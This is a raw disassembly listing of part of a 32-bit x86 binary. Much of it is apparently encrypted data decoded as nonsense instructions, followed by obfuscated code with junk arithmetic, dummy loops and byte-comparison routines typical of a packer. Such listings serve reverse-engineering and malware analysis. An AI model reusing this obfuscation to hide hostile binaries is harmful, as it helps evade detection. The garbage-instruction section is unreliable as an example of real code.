  41888a:	push   es
  41888b:	mov    BYTE PTR [edi-0x11],al
  41888e:	(bad)  
  41888f:	push   cs
  418890:	daa    
  418891:	mov    cs,WORD PTR ds:0xf9471dda
  418897:	hlt    
  418898:	add    eax,0x2a203931
  41889d:	xor    al,0xac
  41889f:	lods   eax,DWORD PTR ds:[esi]
  4188a0:	xor    al,0x18
  4188a2:	pop    ds
  4188a3:	popf   
  4188a4:	sti    
  4188a5:	push   ebp
  4188a6:	push   es
  4188a7:	shr    ecx,0x71
  4188aa:	sub    BYTE PTR [eax-0x49],bh
  4188ad:	and    eax,0xffffffae
  4188b0:	(bad)  
  4188b1:	cs and al,0xfe
  4188b4:	sbb    dl,BYTE PTR [ecx+0x72]
  4188b7:	int    0xe4
  4188b9:	inc    ecx
  4188ba:	sub    dl,BYTE PTR [esp+edi*1+0x22]
  4188be:	pop    es
  4188bf:	push   cs
  4188c0:	loope  0x4188db
  4188c2:	es aam 0x27
  4188c5:	or     BYTE PTR [esi+ebp*2+0x67e66994],al
  4188cc:	mov    edi,DWORD PTR [ebx]
  4188ce:	and    eax,0x906f50f0
  4188d3:	mov    ebx,0x2eb60887
  4188d8:	fs popf 
  4188da:	adc    eax,0x10c0b8e5
  4188df:	mov    edi,0x225010bc
  4188e4:	mov    esp,0xcd0fbf35
  4188e9:	clc    
  4188ea:	push   cs
  4188eb:	add    eax,0x322acc23
  4188f0:	test   al,0x9
  4188f2:	xor    dh,dl
  4188f4:	xchg   esi,eax
  4188f5:	lock fisttp DWORD PTR fs:[esi+0x779c77b3]
  4188fd:	retf   
  4188fe:	xchg   DWORD PTR [edi],eax
  418900:	outs   dx,DWORD PTR ds:[esi]
  418901:	dec    ebp
  418902:	or     DWORD PTR [ebx-0x6e7297cf],edx
  418908:	push   ecx
  418909:	(bad)  
  41890a:	jnp    0x41896b
  41890c:	cmp    DWORD PTR [edx],eax
  41890e:	shl    DWORD PTR [eax],1
  418910:	cmp    al,0x2e
  418912:	dec    ecx
  418913:	add    al,0xf
  418915:	and    edx,ebp
  418917:	outs   dx,BYTE PTR ds:[esi]
  418918:	mov    edi,0x245fb30a
  41891d:	push   ebp
  41891e:	fsub   DWORD PTR [edx+0x13908c2b]
  418924:	push   ss
  418925:	ja     0x418943
  418927:	jno    0x418919
  418929:	mov    esi,0xc5f4946e
  41892e:	sbb    ebp,DWORD PTR [ebx-0xe7c4434]
  418934:	dec    esi
  418935:	mov    ds:0xed18aebb,al
  41893a:	mov    esp,0xcc25975e
  41893f:	mov    edi,0x668bc6a8
  418944:	outs   dx,DWORD PTR ds:[esi]
  418945:	cmp    al,0x41
  418947:	xchg   edx,eax
  418948:	loope  0x41895c
  41894a:	mov    cl,0x3
  41894c:	mov    esp,0xc1372b2b
  418951:	push   ss
  418952:	out    dx,al
  418953:	xchg   ebp,eax
  418954:	(bad)  
  418955:	call   0x45b35801
  41895a:	adc    al,0xc7
  41895c:	out    dx,al
  41895d:	mov    ecx,DWORD PTR [edi]
  41895f:	idiv   BYTE PTR [esi]
  418961:	aam    0x7d
  418963:	fisub  WORD PTR [esi+0x6f030759]
  418969:	mov    BYTE PTR ds:0x3803d0cc,bl
  41896f:	out    dx,al
  418970:	fs xchg esp,eax
  418972:	je     0x4189c2
  418974:	add    eax,0x9523cb81
  418979:	sbb    eax,0x9b5b693f
  41897e:	jo     0x4189a2
  418980:	add    dl,BYTE PTR [edx+0x43]
  418983:	mov    ecx,0x966fd3d4
  418988:	leave  
  418989:	push   ebx
  41898a:	rol    BYTE PTR [esi],1
  41898c:	jmp    0x1634:0x7dd4cb38
  418993:	call   0xf0076a73
  418998:	shl    BYTE PTR [edx+0x63],0x32
  41899c:	div    BYTE PTR [eax-0x80]
  41899f:	push   eax
  4189a0:	fwait
  4189a1:	xlat   BYTE PTR ds:[ebx]
  4189a2:	mov    ebx,esp
  4189a4:	xchg   ecx,eax
  4189a5:	mov    DWORD PTR [ebx],esp
  4189a7:	pop    ecx
  4189a8:	inc    esp
  4189a9:	inc    ebx
  4189aa:	cmp    DWORD PTR [edx-0x19ea6f9f],ebx
  4189b0:	pop    edi
  4189b1:	inc    edx
  4189b2:	sub    al,ah
  4189b4:	fidiv  DWORD PTR [ebx+0x20ec6f78]
  4189ba:	arpl   ax,ax
  4189bc:	or     eax,0xc1287fed
  4189c1:	aad    0x20
  4189c3:	mov    esi,0x5ce083c2
  4189c8:	jmp    0xe105:0x51f10ca8
  4189cf:	add    al,0xeb
  4189d1:	xchg   edi,eax
  4189d2:	leave  
  4189d3:	jge    0x4189b9
  4189d5:	pop    edi
  4189d6:	and    dh,al
  4189d8:	add    DWORD PTR [eax+esi*1],eax
  4189db:	aaa    
  4189dc:	jmp    0x418969
  4189de:	test   eax,0xa309894a
  4189e3:	sub    eax,0x4b64a0c3
  4189e8:	scas   al,BYTE PTR es:[edi]
  4189e9:	mov    dl,0x8
  4189eb:	or     DWORD PTR [esi-0x1719e72],edx
  4189f1:	call   FWORD PTR [eax-0x22]
  4189f4:	inc    eax
  4189f5:	push   ecx
  4189f6:	cmc    
  4189f7:	iret   
  4189f8:	jmp    0x418a33
  4189fa:	push   esp
  4189fb:	repz dec ebx
  4189fd:	adc    ch,BYTE PTR [esi-0x12]
  418a00:	js     0x418a38
  418a02:	cs mov dl,0x3e
  418a05:	shr    eax,cl
  418a07:	mov    edi,DWORD PTR [edi+0x70]
  418a0a:	retf   
  418a0b:	mov    al,0x57
  418a0d:	dec    ecx
  418a0e:	inc    ecx
  418a0f:	dec    edx
  418a10:	cmp    dl,BYTE PTR [edi-0x59b7c73f]
  418a16:	pop    ds
  418a17:	or     dl,BYTE PTR [edx]
  418a19:	mov    ebp,0xdc0ffbae
  418a1e:	mov    dl,0xe7
  418a20:	je     0x4189d3
  418a22:	mov    esp,0x54bafc6b
  418a27:	prefetchwt1 BYTE PTR gs:[edx]
  418a2b:	fsubr  DWORD PTR fs:[ecx+0x6f]
  418a2f:	jo     0x4189ba
  418a31:	sbb    al,0x79
  418a33:	ins    BYTE PTR es:[edi],dx
  418a34:	jne    0x418a75
  418a36:	fld    TBYTE PTR [ebx]
  418a38:	outs   dx,BYTE PTR ds:[esi]
  418a39:	loope  0x4189cb
  418a3b:	jbe    0x4189c2
  418a3d:	dec    ecx
  418a3e:	daa    
  418a3f:	add    ebx,DWORD PTR [ecx-0x384aa379]
  418a45:	(bad)  
  418a46:	(bad)  
  418a47:	mov    ch,0x44
  418a49:	in     eax,dx
  418a4a:	aaa    
  418a4b:	mov    edi,0xdd1ea750
  418a50:	test   eax,0x625cd153
  418a55:	sub    esp,DWORD PTR [ebx-0x38e88d16]
  418a5b:	jmp    0x418a0a
  418a5d:	cld    
  418a5e:	jg     0x418a7c
  418a60:	jo     0x418a70
  418a62:	enter  0xbb77,0x27
  418a66:	mov    dl,0x79
  418a68:	xor    al,0x94
  418a6a:	dec    edx
  418a6b:	mov    fs,WORD PTR [edx-0x52]
  418a6e:	adc    ecx,DWORD PTR [ebx]
  418a70:	ret    
  418a71:	jno    0x418a48
  418a73:	aaa    
  418a74:	(bad)  
  418a75:	test   BYTE PTR [edi+0x25c39a2f],0x67
  418a7c:	shl    DWORD PTR [edi+0x27582eb4],0x92
  418a83:	mov    dl,0x90
  418a85:	jecxz  0x418ad8
  418a87:	lds    ebp,FWORD PTR [ebp+0x42]
  418a8a:	mov    edi,0x5a48237a
  418a8f:	pop    ds
  418a90:	sub    dh,BYTE PTR [edx-0x79]
  418a93:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  418a95:	mov    ah,0x73
  418a97:	xchg   edi,eax
  418a98:	push   ebp
  418a99:	mov    bh,0xf4
  418a9b:	lds    ebp,FWORD PTR [edx]
  418a9d:	xchg   DWORD PTR [ecx+0x406df6da],edx
  418aa3:	enter  0xc75,0xd7
  418aa7:	shl    BYTE PTR [ecx+0x18],1
  418aaa:	sub    BYTE PTR [edx-0xb61f527],bh
  418ab0:	repnz bound esp,QWORD PTR [ebx]
  418ab3:	jmp    0x7b53:0x9c9f60ea
  418aba:	rol    BYTE PTR [ebx-0x18a9548f],0x82
  418ac1:	add    DWORD PTR [edi],edx
  418ac3:	xchg   esp,eax
  418ac4:	inc    ecx
  418ac5:	mov    esp,0x7baa7159
  418aca:	stos   BYTE PTR es:[edi],al
  418acb:	jge    0x418b18
  418acd:	adc    BYTE PTR [ebx+0x33],bl
  418ad0:	xchg   ebp,eax
  418ad1:	cmp    eax,0xcfbf9cb8
  418ad6:	jl     0x418a6d
  418ad8:	and    dl,ch
  418ada:	sub    ecx,DWORD PTR [ecx]
  418adc:	sub    edx,esp
  418ade:	add    al,0xbd
  418ae0:	leave  
  418ae1:	mov    al,ds:0x347b664b
  418ae6:	ins    DWORD PTR es:[edi],dx
  418ae7:	or     edx,DWORD PTR [edi]
  418ae9:	out    dx,al
  418aea:	mov    edi,0xb6c28d91
  418aef:	ror    BYTE PTR [ebp+0x20866783],1
  418af5:	out    0x22,eax
  418af7:	xchg   edi,eax
  418af8:	ins    DWORD PTR es:[edi],dx
  418af9:	push   esi
  418afa:	cli    
  418afb:	cmp    esi,DWORD PTR [ebx]
  418afd:	push   edx
  418afe:	jns    0x418b40
  418b00:	popa   
  418b01:	mov    eax,ds:0x4a084e7f
  418b06:	inc    ebp
  418b07:	dec    edx
  418b08:	pusha  
  418b09:	aad    0x6c
  418b0b:	jb     0x418a9e
  418b0d:	ds inc eax
  418b0f:	or     ebp,DWORD PTR [ebx]
  418b11:	push   ebp
  418b12:	push   ds
  418b13:	push   ebp
  418b14:	not    bh
  418b16:	fist   DWORD PTR [ebx+ebx*4]
  418b19:	mov    bh,0x77
  418b1b:	sti    
  418b1c:	es fwait
  418b1e:	aad    0x2f
  418b20:	nop
  418b21:	cmp    eax,eax
  418b23:	xor    al,al
  418b25:	inc    esp
  418b26:	jl     0x418aeb
  418b28:	cli    
  418b29:	adc    esp,DWORD PTR [edi+0x75]
  418b2c:	xchg   ebp,eax
  418b2d:	mov    esi,0xd50b5cbd
  418b32:	pop    edx
  418b33:	nop
  418b34:	push   esi
  418b35:	ret    0xddb8
  418b38:	scas   al,BYTE PTR es:[edi]
  418b39:	adc    DWORD PTR ds:0x40ff3bc0,esp
  418b3f:	in     al,0xfa
  418b41:	(bad)  
  418b42:	aad    0x5b
  418b44:	imul   edi,DWORD PTR [edx],0xffffffdf
  418b47:	popf   
  418b48:	sbb    al,bl
  418b4a:	ja     0x418b33
  418b4c:	cld    
  418b4d:	hlt    
  418b4e:	xchg   esp,eax
  418b4f:	neg    edx
  418b51:	call   FWORD PTR [edi*2+0x58b271ee]
  418b58:	dec    esi
  418b59:	pushf  
  418b5a:	pop    esp
  418b5b:	retf   0x6a3f
  418b5e:	push   es
  418b5f:	push   0xffffffcc
  418b61:	mov    al,0x63
  418b63:	push   ecx
  418b64:	ret    
  418b65:	adc    eax,0x6cb6541d
  418b6a:	in     eax,dx
  418b6b:	pop    ss
  418b6c:	mov    esp,0x67faa9c
  418b71:	xor    BYTE PTR [ebx-0x6efa2aca],bh
  418b77:	(bad)  
  418b78:	in     al,0xbe
  418b7a:	mov    ds:0xb912f00c,eax
  418b7f:	jp     0x418b78
  418b81:	push   es
  418b82:	repnz fstp st(5)
  418b85:	call   0x33c6:0x6066dfec
  418b8c:	mov    dh,0x4c
  418b8e:	lahf   
  418b8f:	icebp  
  418b90:	pop    ebx
  418b91:	in     al,dx
  418b92:	and    DWORD PTR [ebx],esi
  418b94:	dec    eax
  418b95:	jo     0x418c08
  418b97:	pop    esp
  418b98:	in     eax,0xfe
  418b9a:	jno    0x418b79
  418b9c:	inc    esi
  418b9d:	fwait
  418b9e:	in     al,dx
  418b9f:	aaa    
  418ba0:	dec    eax
  418ba1:	call   0x7b298fa3
  418ba6:	jmp    0x418c17
  418ba8:	push   0xffffffbc
  418baa:	jle    0x418be2
  418bac:	clc    
  418bad:	jecxz  0x418bc1
  418baf:	leave  
  418bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bb1:	bound  eax,QWORD PTR [ebp-0x59]
  418bb4:	cmc    
  418bb5:	in     al,0x94
  418bb7:	enter  0xa193,0xb2
  418bbb:	mov    ebp,0x3f97a11d
  418bc0:	push   cs
  418bc1:	mov    al,0x1e
  418bc3:	xor    DWORD PTR [edi],0xfffffffb
  418bc6:	mov    eax,ds:0xaff6e7
  418bcb:	jb     0x418c0c
  418bcd:	pusha  
  418bce:	push   0xffffff92
  418bd0:	stc    
  418bd1:	out    0xcf,eax
  418bd3:	div    BYTE PTR [ebx-0x38ce5922]
  418bd9:	in     eax,0xb
  418bdb:	stos   DWORD PTR es:[edi],eax
  418bdc:	xor    al,0x47
  418bde:	repnz int 0x18
  418be1:	lock jno 0x418b8c
  418be4:	xchg   edi,eax
  418be5:	gs stc 
  418be7:	data16 (bad) 
  418be9:	xlat   BYTE PTR ds:[ebx]
  418bea:	xor    eax,0x3bf36472
  418bef:	aad    0x68
  418bf1:	retf   
  418bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bf3:	or     eax,0xbf828d05
  418bf8:	xchg   dh,dl
  418bfa:	mov    dh,0x35
  418bfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bfd:	jle    0x418c04
  418bff:	dec    edx
  418c00:	xchg   ebx,eax
  418c01:	out    dx,al
  418c02:	jbe    0x418b9a
  418c04:	mov    esp,DWORD PTR [ebx+0x20fd376e]
  418c0a:	in     al,0xdc
  418c0c:	xor    DWORD PTR [esi+edi*1],0xffffff80
  418c10:	xor    eax,0x7d280aa1
  418c15:	jo     0x418c0f
  418c17:	push   es
  418c18:	mov    BYTE PTR [ecx+0x57999753],dl
  418c1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c1f:	jmp    0x418c18
  418c21:	jns    0x418c45
  418c23:	pop    ss
  418c24:	jmp    0x4279d732
  418c29:	fadd   QWORD PTR [ebx+ebx*4-0x14595795]
  418c30:	div    dh
  418c32:	sbb    eax,0xed1dbbc8
  418c37:	outs   dx,DWORD PTR ds:[esi]
  418c38:	ror    DWORD PTR ds:0xcdfe0454,1
  418c3e:	cmp    dl,BYTE PTR [esi+edi*4+0x7d]
  418c42:	mov    ch,0xe5
  418c44:	xchg   edi,eax
  418c45:	sub    DWORD PTR [edi+0x58],0xf4afc498
  418c4c:	dec    edi
  418c4d:	psrlq  mm1,QWORD PTR [ebp-0x58f4b826]
  418c54:	jne    0x418c73
  418c56:	cmp    cl,BYTE PTR [ebx+0x4ec83e79]
  418c5c:	add    DWORD PTR [edi],ebp
  418c5e:	push   edx
  418c5f:	xor    eax,0xabdbbc53
  418c64:	call   0x58e1:0x1367c1b2
  418c6b:	push   esi
  418c6c:	fsubr  DWORD PTR [ecx-0x632867e9]
  418c72:	outs   dx,DWORD PTR ds:[esi]
  418c73:	xchg   edi,eax
  418c74:	leave  
  418c75:	iret   
  418c76:	sbb    DWORD PTR [eax-0x13],edx
  418c79:	ror    BYTE PTR [ebx],1
  418c7b:	or     al,0xf
  418c7d:	out    dx,al
  418c7e:	call   0xa3da:0xbf48880d
  418c85:	pop    ecx
  418c86:	push   edx
  418c87:	cmp    ebx,DWORD PTR [ecx-0x11b39526]
  418c8d:	inc    eax
  418c8e:	push   esi
  418c8f:	mov    dl,0x33
  418c91:	stos   DWORD PTR es:[edi],eax
  418c92:	push   0x64
  418c94:	ins    DWORD PTR es:[edi],dx
  418c95:	inc    esi
  418c96:	xchg   BYTE PTR [edi-0x5],ah
  418c99:	(bad)  [ecx+edi*8-0x74bb18bf]
  418ca0:	mov    eax,0x23ce27ae
  418ca5:	jmp    0xf3aa:0xfd27c4d1
  418cac:	cdq    
  418cad:	int    0xe1
  418caf:	ret    
  418cb0:	push   0xffffffaf
  418cb2:	iret   
  418cb3:	inc    ebx
  418cb4:	in     eax,dx
  418cb5:	icebp  
  418cb6:	push   0xa7bdac7d
  418cbb:	scas   al,BYTE PTR es:[edi]
  418cbc:	jmp    0x1661aa5d
  418cc1:	mov    ch,0xc1
  418cc3:	in     al,dx
  418cc4:	repnz mov WORD PTR [ebx],fs
  418cc7:	sbb    bl,al
  418cc9:	loopne 0x418d16
  418ccb:	xchg   edx,eax
  418ccc:	xor    DWORD PTR [esi+0x27],eax
  418ccf:	icebp  
  418cd0:	xor    dl,BYTE PTR [esi-0x291486d]
  418cd6:	call   0x8dd5c5ca
  418cdb:	(bad)  
  418cdc:	loop   0x418d3c
  418cde:	cmp    ah,BYTE PTR [ebx+0x7555ca8d]
  418ce4:	xlat   BYTE PTR ds:[ebx]
  418ce5:	jg     0x418d51
  418ce7:	adc    eax,0xd96b1757
  418cec:	or     DWORD PTR [ebx],ebx
  418cee:	ins    BYTE PTR es:[edi],dx
  418cef:	dec    DWORD PTR [ebx+0x40a8e78d]
  418cf5:	pop    edi
  418cf6:	inc    ebp
  418cf7:	sub    DWORD PTR [ebp+0x18],edx
  418cfa:	lock stc 
  418cfc:	jg     0x418ce7
  418cfe:	push   ebp
  418cff:	(bad)  
  418d00:	loop   0x418d76
  418d02:	and    edi,eax
  418d04:	adc    ch,BYTE PTR [eax]
  418d06:	push   eax
  418d07:	sbb    ch,BYTE PTR [ecx+eiz*8-0x31ff59df]
  418d0e:	fisub  DWORD PTR [ebx-0x17]
  418d12:	ficomp WORD PTR [ebp-0x7c5c886b]
  418d18:	push   0x3c
  418d1a:	inc    ebp
  418d1b:	scas   al,BYTE PTR es:[edi]
  418d1c:	inc    ebx
  418d1d:	dec    ecx
  418d1e:	rcl    ebx,cl
  418d20:	test   BYTE PTR [esi+0x2fcd5084],dl
  418d26:	(bad)  
  418d27:	xchg   ebp,eax
  418d28:	cdq    
  418d29:	outs   dx,BYTE PTR ds:[esi]
  418d2a:	test   eax,0x21241365
  418d2f:	push   DWORD PTR [edx+0x4cf3a466]
  418d35:	stc    
  418d36:	jbe    0x418d8b
  418d38:	push   esi
  418d39:	idiv   ebp
  418d3b:	je     0x418d70
  418d3d:	mov    ecx,ebx
  418d3f:	out    dx,eax
  418d40:	inc    esp
  418d41:	es imul eax,esp,0x51d1bec0
  418d48:	icebp  
  418d49:	bound  ecx,QWORD PTR [esi+ebx*8]
  418d4c:	cmp    ecx,DWORD PTR [ecx]
  418d4e:	mov    eax,ds:0x1af0d374
  418d53:	mov    ebp,ecx
  418d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d56:	mov    dh,0xc2
  418d58:	pushf  
  418d59:	ror    edx,cl
  418d5b:	inc    edx
  418d5c:	sub    eax,0xa66bb673
  418d61:	adc    DWORD PTR [ebx-0x45],edi
  418d64:	mov    al,0x69
  418d66:	(bad)  
  418d68:	mov    edx,0xde866428
  418d6d:	es loope 0x418d67
  418d70:	(bad)  
  418d71:	arpl   WORD PTR [esi+0x3d],bp
  418d74:	inc    esi
  418d75:	rcr    DWORD PTR [edx+ebp*4-0x3278a60b],cl
  418d7c:	xor    al,BYTE PTR [ecx]
  418d7e:	push   0xb83ba67f
  418d83:	repnz leave 
  418d85:	dec    ecx
  418d86:	pop    ds
  418d87:	mov    ah,0xeb
  418d89:	xchg   esi,eax
  418d8a:	adc    al,0x42
  418d8c:	imul   BYTE PTR [edx+esi*4-0x5]
  418d90:	or     ebx,DWORD PTR [edi+0x1e]
  418d93:	and    ch,cl
  418d95:	add    al,0xd
  418d97:	cli    
  418d98:	jle    0x418dfd
  418d9a:	push   edi
  418d9b:	pop    esp
  418d9c:	cdq    
  418d9d:	arpl   di,sp
  418d9f:	mov    WORD PTR [ebx+0x31],gs
  418da2:	and    bh,BYTE PTR [edx+eiz*8+0x4]
  418da6:	cwde   
  418da7:	into   
  418da8:	enter  0xcaaa,0x16
  418dac:	and    ch,BYTE PTR [ecx-0xba8db0]
  418db2:	enter  0x6c9a,0x3a
  418db6:	xor    eax,0x34814168
  418dbb:	pop    esi
  418dbc:	enter  0x4c4b,0x76
  418dc0:	pop    ebx
  418dc1:	add    ch,BYTE PTR [ebp+0x49]
  418dc4:	xchg   ebp,eax
  418dc5:	pusha  
  418dc6:	mov    ah,0x88
  418dc8:	xchg   edi,eax
  418dc9:	push   0xe937f87d
  418dce:	mov    bh,0x9a
  418dd1:	adc    esi,DWORD PTR [ebx-0x22281d90]
  418dd7:	mov    ah,0xc9
  418dd9:	into   
  418dda:	push   esi
  418ddb:	icebp  
  418ddc:	neg    BYTE PTR [eax]
  418dde:	ds fnsetpm(287 only) 
  418de1:	std    
  418de2:	ror    DWORD PTR [esi+0x35d74712],0x3b
  418de9:	daa    
  418dea:	pop    ecx
  418deb:	dec    edx
  418dec:	xchg   DWORD PTR [ebx-0x9],esi
  418def:	push   cs
  418df0:	rol    BYTE PTR [edi+0x4b],cl
  418df3:	jl     0x418df2
  418df5:	mov    esi,ebx
  418df7:	pop    ss
  418df8:	or     edi,edi
  418dfa:	arpl   WORD PTR fs:[eax],di
  418dfd:	or     esp,DWORD PTR ds:0x7e1eaa54
  418e03:	xchg   esp,eax
  418e04:	jecxz  0x418e0d
  418e06:	sub    DWORD PTR [edi-0x4d],esi
  418e09:	mov    edx,DWORD PTR [ebp-0x10]
  418e0c:	or     DWORD PTR ds:0x428e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x428e7b,0x428ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x428ec3,0x428e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x428e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x428e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x428e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x428eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x428ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x428e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x428e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x428e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x428e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x428e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x428e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x42a9ff
  418ecd:	cmp    DWORD PTR ds:0x428e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x428e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x428e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x428e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x428e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x428e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x428eeb
  418f37:	mov    ebx,DWORD PTR ds:0x428ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x428ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x428ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x428ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4281a7
  418f73:	call   DWORD PTR ds:0x42aa03
  418f79:	cmp    DWORD PTR ds:0x428ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x428ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x428ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x428ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x428ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
